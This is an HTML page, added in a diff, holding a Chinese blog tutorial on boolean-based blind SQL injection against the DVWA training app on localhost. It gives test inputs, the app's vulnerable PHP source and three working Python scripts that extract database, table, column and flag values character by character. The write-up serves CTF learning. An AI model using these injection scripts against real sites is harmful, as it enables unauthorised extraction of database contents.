@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="Lethe&#39;s Blog">
+    <meta name="author" content="Lethe">
+    <meta name="keywords" content="Lethe&#39;s Blog">
+    <title>以dvwa为例学习简单sql布尔盲注的详细脚本 ~ Lethe&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>Lethe&#39;s Blog</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/img/2.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">以dvwa为例学习简单sql布尔盲注的详细脚本</p>
+            <br>
+            
+            <p>Saturday, March 2nd 2019, 6:55 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><p><br></p>
+<h4 id="1-SQL注入与SQL盲注"><a href="#1-SQL注入与SQL盲注" class="headerlink" title="1.SQL注入与SQL盲注"></a>1.SQL注入与SQL盲注</h4><p><strong>SQL注入：</strong></p>
+<ul>
+<li>执行SQL注入攻击时，服务器会响应来自数据库服务器的错误信息，信息提示SQL语法不正确等</li>
+<li>一般在页面上直接就会显示执行sql语句的结果</li>
+</ul>
+<p><strong>SQL盲注：</strong></p>
+<ul>
+<li>一般情况，执行SQL盲注，服务器不会直接返回具体的数据库错误or语法错误，而是会返回程序开发所设置的特定信息（也有特例，如基于报错的盲注）</li>
+<li>一般在页面上不会直接显示sql执行的结果</li>
+<li>有可能出现不确定sql是否执行的情况</li>
+</ul>
+<p><br></p>
+<h4 id="2-SQL盲注分类"><a href="#2-SQL盲注分类" class="headerlink" title="2.SQL盲注分类"></a>2.SQL盲注分类</h4><p>根据页面不同的响应方式，SQL盲注分为：<strong>基于布尔的盲注、基于时间的盲注、基于报错的盲注</strong></p>
+<p>（1）对于<strong>基于布尔的盲注</strong>，可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True<-->False发生变化的转折点。<br>（2）对于<strong>基于时间的盲注</strong>，通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。<br>（3）对于<strong>基于报错的盲注</strong>，搜寻查看网上部分Blog，基本是在rand()函数作为group by的字段进行联用的时候会违反Mysql的约定而报错。rand()随机不确定性，使得group by会使用多次而报错。</--></p>
+<p><br></p>
+<h4 id="3-SQL盲注测试流程"><a href="#3-SQL盲注测试流程" class="headerlink" title="3.SQL盲注测试流程"></a>3.SQL盲注测试流程</h4><p>SQL盲注的测试过程与DVWA的普通SQL Injection操作流程类似，大致测试流程如下：</p>
+<ul>
+<li>判断是否存在注入，注入的类型</li>
+<li>猜解当前数据库名称</li>
+<li>猜解数据库中的表名</li>
+<li>猜解表中的字段名</li>
+<li>获取表中的字段值</li>
+<li>获取数据库的其他信息：版本、用户…</li>
+</ul>
+<p><br></p>
+<h4 id="4-Requests库的使用"><a href="#4-Requests库的使用" class="headerlink" title="4.Requests库的使用"></a>4.Requests库的使用</h4><p>在CTF中里，python脚本中最基本的就是requests库的使用，本文不过多介绍其使用方法，可参考以下官方文档，讲的很详细：<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">快速上手——requests</a>以及<a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html#advanced" target="_blank" rel="noopener">高级用法——request</a></p>
+<p><br></p>
+<h2 id="0x02-前置工作"><a href="#0x02-前置工作" class="headerlink" title="0x02 前置工作"></a>0x02 前置工作</h2><p><br></p>
+<p>1.为了更贴近CTF比赛的模式，因此在dvwa的数据库中加入了flag，最终脚本的结果也是爆出flag<br>2.加了两个flag是为了更好体现脚本的功能<br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302141221969.png" alt="dvwa库中的表"><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302141308470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><br></p>
+<h2 id="0x03-Low-SQL-Injection-Blind"><a href="#0x03-Low-SQL-Injection-Blind" class="headerlink" title="0x03 Low SQL Injection (Blind)"></a>0x03 Low SQL Injection (Blind)</h2><p><br></p>
+<h4 id="1-测试分析"><a href="#1-测试分析" class="headerlink" title="1.测试分析"></a>1.测试分析</h4><p>经过简单的测试之后发现，页面只会出现两种回显，即</p>
+<pre><code>  User ID exists in the database.
+</code></pre><p>   和</p>
+<pre><code>  User ID is MISSING from the database.
+</code></pre><table>
+<thead>
+<tr>
+<th>构造User ID取值的语句</th>
+<th>回显结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>exists</td>
+</tr>
+<tr>
+<td>‘</td>
+<td>MISSING</td>
+</tr>
+<tr>
+<td>1 and 1=1 #</td>
+<td>exists</td>
+</tr>
+<tr>
+<td>1 and 1=2 #</td>
+<td>exists</td>
+</tr>
+<tr>
+<td>1’ and 1=1 #</td>
+<td>exists</td>
+</tr>
+<tr>
+<td>1’ and 1=2 #</td>
+<td>MISSING</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>满足查询条件则返回”User ID exists in the database.”，不满足查询条件则返回”User ID is MISSING from the database.”</li>
+<li>两者返回的内容随所构造的真假条件而不同，说明存在SQL盲注</li>
+<li>由最后两行构造真假条件返回对应不同的结果，可知存在字符型的SQL盲注。</li>
+</ul>
+<p>因为本文主要目的为脚本的编写，因此查看源码：</p>
+<pre><code class="php">&lt;?php 
+
+if( isset( $_GET[ &#39;Submit&#39; ] ) ) { 
+    // Get input 
+    $id = $_GET[ &#39;id&#39; ]; 
+
+    // Check database 
+    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors 
+
+    // Get results 
+    $num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors 
+    if( $num &gt; 0 ) { 
+        // Feedback for end user 
+        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; 
+    } 
+    else { 
+        // User wasn&#39;t found, so the page wasn&#39;t! 
+        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); 
+
+        // Feedback for end user 
+        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; 
+    } 
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); 
+} 
+
+?&gt; 
+</code></pre>
+<ul>
+<li>文本框输入并提交的形式，GET请求方式</li>
+<li>未作任何输入过滤和限制，攻击者可任意构造所想输入的sql查询</li>
+</ul>
+<p><br></p>
+<h4 id="2-脚本编写"><a href="#2-脚本编写" class="headerlink" title="2.脚本编写"></a>2.脚本编写</h4><p>脚本中所用到的SQL语句与dvwa前面非盲注时语句差不多，可参考：<a href="https://blog.csdn.net/qq_42181428/article/details/87892132" target="_blank" rel="noopener">dvwa之SQL注入（1）</a></p>
+<p><strong>（1）脚本一：爆库名、表个数、表名</strong><br>我这里写的脚本是将当前数据库的所有表名都跑出来，实际在CTF比赛中，为节约时间可以不必这么做，因为一般包含flag的表名都会有特殊含义，只需要知道包含flag的表名即可。</p>
+<pre><code class="python">#!/usr/bin/env python3
+# -*- coding: UTF-8 -*-
+
+import requests
+
+# 脚本里用到的参数
+# databaseLen   库名长度
+# databse_name  库名
+# tableNum      表的数量
+# tableLen      表名长度
+# table_name    表名
+
+s = requests.Session()
+
+url = &#39;http://localhost:8081/dvwa/vulnerabilities/sqli_blind/&#39;
+
+payloads = &#39;abcdefghijklmnopqrstuvwxyz1234567890&#39; 
+# 这里为节约时间只包含小写字母与数字，实际可能还有大写字母与符号
+
+headers = {&#39;Cookie&#39;: &#39;security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0&#39;}
+# 因为dvwa需要登陆，所以要在头部里加入cookie
+
+# 1.先爆破库名的长度，以提高后续循环的效率,也可以不爆破长度，直接爆破名称（只要循环数大于长度）
+for j in range(1,50):
+    databaseLen_payload = &#39;?id=1\&#39; and length(database())=&#39;+str(j)+&#39; %23&amp;Submit=Submit#&#39;
+    # 所有payload里的注释#要用url编码表示，因为这是直接添加在url里的
+    if &#39;User ID exists in the database.&#39; in s.get(url+databaseLen_payload, headers=headers).text:
+        databaseLen = j
+        break
+print(&#39;database_lenth: &#39;+str(databaseLen))
+
+# 2.爆库名
+databse_name = &#39;&#39;
+for j in range(1,databaseLen+1):
+    for i in payloads:
+        databse_payload = &#39;?id=1\&#39; and substr(database(),&#39;+str(j)+&#39;,1)=\&#39;&#39;+str(i)+&#39;\&#39; %23&amp;Submit=Submit#&#39;
+
+        if &#39;User ID exists in the database.&#39; in s.get(url+databse_payload, headers=headers).text:
+            databse_name += i
+print(&#39;database_name: &#39;+databse_name)
+
+# 3.爆破表的个数
+for j in range(1,50):
+    tableNum_payload = &#39;?id=1\&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=&#39;+str(j)+&#39; %23&amp;Submit=Submit#&#39;
+    if &#39;User ID exists in the database.&#39; in s.get(url+tableNum_payload, headers=headers).text:
+        tableNum = j
+        break
+print(&#39;tableNum: &#39;+str(tableNum))
+
+# 4.爆出所有的表名
+# (1)爆出各个表名的长度
+for j in range(0,tableNum):
+    table_name = &#39;&#39;
+    for i in range(1,50):
+        tableLen_payload = &#39;?id=1\&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit &#39;+str(j)+&#39;,1),1))=&#39;+str(i)+&#39; %23&amp;Submit=Submit#&#39;
+                # 用法substr(&#39;This is a test&#39;, 6) 返回&#39;is a test&#39;
+        if &#39;User ID exists in the database.&#39; in s.get(url+tableLen_payload, headers=headers).text:
+            tableLen = i
+            print(&#39;table&#39;+str(j+1)+&#39;_length: &#39;+str(tableLen))
+
+            # (2)内部循环爆破每个表的表名
+            for m in range(1,tableLen+1):
+                for n in payloads: # i在上个循环用过了
+                    table_payload = &#39;?id=1\&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit &#39;+str(j)+&#39;,1),&#39;+str(m)+&#39;,1)=\&#39;&#39;+str(n)+&#39;\&#39; %23&amp;Submit=Submit#&#39;
+                    if &#39;User ID exists in the database.&#39; in s.get(url+table_payload, headers=headers).text:
+                        table_name += n
+            print(&#39;table&#39;+str(j+1)+&#39;_name: &#39;+table_name)
+</code></pre>
+<p><strong>脚本一的运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171115839.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="script1"></p>
+<p><strong>（2）脚本二：爆列名</strong><br>由脚本一得到的结果，很显然flag应该在‘flagishere’表中，因此脚本二只是针对此表来跑出其中所有的列名。</p>
+<pre><code class="python">#!/usr/bin/env python3
+# -*- coding: UTF-8 -*-
+# 根据上个脚本得到的结果，此脚本用来跑出&#39;flagishere&#39;表中的字段
+
+import requests
+
+s = requests.Session()  # 保持回话
+
+url = &#39;http://localhost:8081/dvwa/vulnerabilities/sqli_blind/&#39;
+
+payloads = &#39;abcdefghijklmnopqrstuvwxyz1234567890&#39;
+
+headers = {&#39;Cookie&#39;: &#39;security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0&#39;}
+# 因为dvwa需要登陆，所以要在头部里加入cookie
+
+# 1.判断flgishere表中字段数目
+columnNum = 0 
+for j in range(50):
+    columnNum_payload = &#39;?id=1\&#39; and (select count(column_name) from information_schema.columns where table_name=\&#39;flagishere\&#39;)=&#39;+str(j)+&#39; %23&amp;Submit=Submit#&#39;
+    if &#39;User ID exists in the database.&#39; in s.get(url+columnNum_payload, headers=headers).text:
+        columnNum = j
+        break
+print(&#39;columnNum: &#39;+str(columnNum))
+
+# 2.爆出每个字段名的长度
+for j in range(0,columnNum):
+    column_name = &#39;&#39;
+    for i in range(1,50):
+        columnLen_payload = &#39;?id=1\&#39; and length(substr((select column_name from information_schema.columns where table_name=\&#39;flagishere\&#39; limit &#39;+str(j)+&#39;,1),1))=&#39;+str(i)+&#39; %23&amp;Submit=Submit#&#39;
+        if &#39;User ID exists in the database.&#39; in s.get(url+columnLen_payload, headers=headers).text:
+            columnLen = i
+            print(&#39;column&#39;+str(j+1)+&#39;_length: &#39;+str(columnLen))
+
+            # (2)内部循环爆破每个表的表名
+            for m in range(1,columnLen+1):
+                for n in payloads: # i在上个循环用过了
+                    column_payload = &#39;?id=1\&#39; and substr((select column_name from information_schema.columns where table_name=\&#39;flagishere\&#39; limit &#39;+str(j)+&#39;,1),&#39;+str(m)+&#39;,1)=\&#39;&#39;+str(n)+&#39;\&#39; %23&amp;Submit=Submit#&#39;
+                    if &#39;User ID exists in the database.&#39; in s.get(url+column_payload, headers=headers).text:
+                        column_name += n
+            print(&#39;column&#39;+str(j+1)+&#39;_name: &#39;+column_name)
+</code></pre>
+<p><strong>脚本二运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171725965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="script2"></p>
+<p><strong>（3）脚本三：爆字段内容</strong><br>由脚本二的结果得知，真正的flag应该在’flagishere’表中的’flag’列下，所有脚本三就跑出该列下每条记录的值，也就是最终的flag(这里为了展示脚本可以爆多条记录的功能，所以自己设置了两个flag)</p>
+<pre><code class="python">#!/usr/bin/env python3
+# -*- coding: UTF-8 -*-
+
+# 根据上个脚本得到的结果，此脚本用来跑出&#39;flagishere&#39;表中的字段名为&#39;flag&#39;
+# 所以此脚本用来爆破flag字段中的内容
+
+import requests
+
+s = requests.Session()  # 保持回话
+
+url = &#39;http://localhost:8081/dvwa/vulnerabilities/sqli_blind/&#39;
+
+payloads = &#39;abcdefghijklmnopqrstuvwxyz1234567890\{\}&#39;
+
+headers = {&#39;Cookie&#39;: &#39;security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0&#39;}
+# 因为dvwa需要登陆，所以要在头部里加入cookie
+
+# 判断flag字段中记录(行)数量
+rowNum = 0
+for j in range(50):
+    rowNum_payload = &#39;?id=1\&#39; and (select count(*) from flagishere)=&#39;+str(j)+&#39; %23&amp;Submit=Submit#&#39;
+    if &#39;User ID exists in the database.&#39; in s.get(url+rowNum_payload, headers=headers).text:
+        rowNum = j
+print(&quot;row_number: &quot;+str(rowNum))
+
+
+# 先爆每个字段值长度，以便控制循环，提高效率，也可省略此步骤，但要保证循环大于字段长度
+for j in range(0,rowNum+1):
+
+    rowContent = &#39;&#39;
+    for i in range(50):
+       #rowLen_payload = &#39;?id=1\&#39; and length(substr(select flag from flagishere limit &#39;+str(j)+&#39;,1),1)=&#39;+str(i)+&#39; %23&amp;Submit=Submit#&#39;
+        rowLen_payload = &#39;?id=1\&#39; and length(substr((select flag from flagishere limit &#39;+str(j)+&#39;,1),1))=&#39;+str(i)+&#39; %23&amp;Submit=Submit#&#39;
+        if &#39;User ID exists in the database.&#39; in s.get(url+rowLen_payload, headers=headers).text:    
+            rowLen = i
+            print(&#39;row&#39;+str(j+1)+&#39;_length: &#39;+str(rowLen))
+            #爆出个字段内容
+            for m in range(1,rowLen+1):
+                for n in payloads:
+                    rowContent_payload = &#39;?id=1\&#39; and substr((select flag from flagishere limit &#39;+str(j)+&#39;,1),&#39;+str(m)+&#39;,1)=\&#39;&#39;+str(n)+&#39;\&#39; %23&amp;Submit=Submit#&#39;
+                    if &#39;User ID exists in the database.&#39; in s.get(url+rowContent_payload, headers=headers).text:
+                        rowContent += n  
+            print(&#39;row&#39;+str(j+1)+&#39;_content: &#39;+rowContent)  
+</code></pre>
+<p><strong>脚本三运行结果如下:</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302172239513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="script3"></p>
+<p><br></p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>由于是刚入门的小白，各方面都在起步之中，还有许多需要继续努学习的，尤其要提高自己的代码编写能力，关于sql注入的学习也还会继续。</p>
+
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;CTF</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+                    <p class="note note-warning">原创文章，转载请注明出处！</p>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+
+    
+    <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = 'https://lethe.site/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/'; 
+            this.page.identifier = '/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
